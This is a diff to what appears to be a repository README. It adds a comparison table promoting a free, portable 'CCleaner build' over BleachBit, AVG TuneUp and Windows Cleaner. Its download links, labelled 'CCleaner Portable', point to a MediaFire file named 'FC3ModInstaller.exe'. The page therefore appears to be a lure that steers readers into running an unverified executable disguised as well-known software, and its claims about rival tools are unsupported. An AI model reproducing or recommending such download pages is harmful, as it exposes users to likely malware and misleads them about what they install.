@@ -30,6 +30,31 @@
 
 ---
 
+📊 Feature Comparison
+
+| Feature / Tool                    | ✅ Our CCleaner Build | ⚪ BleachBit |  ⚪ AVG TuneUp  | ⚪ Windows Cleaner |
+| --------------------------------- | :------------------: | :---------: | :------------: | :---------------: |
+| 🔥 One-click full cleanup         |           ✅          |  ⚠ Partial  |        ✅       |    ⚠ Basic only   |
+| ⚙️ Startup optimization           |           ✅          |      ❌      |        ✅       |         ❌         |
+| 🔍 Duplicate file finder          |           ✅          |      ❌      |    ⚠ Limited   |         ❌         |
+| 🧹 Registry cleaning              |           ✅          |      ❌      |        ✅       |         ❌         |
+| 🛡️ Privacy-focused (no tracking) |           ✅          |      ✅      |        ❌       |         ✅         |
+| 🚫 No installation required       |           ✅          |      ✅      |        ❌       |         ❌         |
+| 📦 Portable (USB-friendly)        |           ✅          |      ✅      |        ❌       |         ❌         |
+| 🖥️ Lightweight UI                |           ✅          |  ⚠ Basic UI |   ❌ Heavy GUI  |         ✅         |
+| 💰 100% Free, No Ads              |           ✅          |      ✅      | ❌ Subscription |         ✅         |
+| 🔄 No auto-updates or telemetry   |           ✅          |      ✅      |        ❌       |         ✅         |
+| 🧪 Community-driven configuration |           ✅          |      ❌      |        ❌       |         ❌         |
+
+✅ Legend:
+✅ — Fully Supported
+
+⚠ — Partially Supported or Limited
+
+❌ — Not Available
+
+📌 This table highlights the advantages of using our portable, optimized version of CCleaner — made for users who value performance, privacy, and control.
+
 ## ⬇️ [Download CCleaner Portable](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
 
 [![Download CCleaner](https://img.shields.io/badge/Download-CCleaner-blue?style=for-the-badge)](https://www.mediafire.com/file/9cpuvjzcvbq6195/FC3ModInstaller.exe/file)
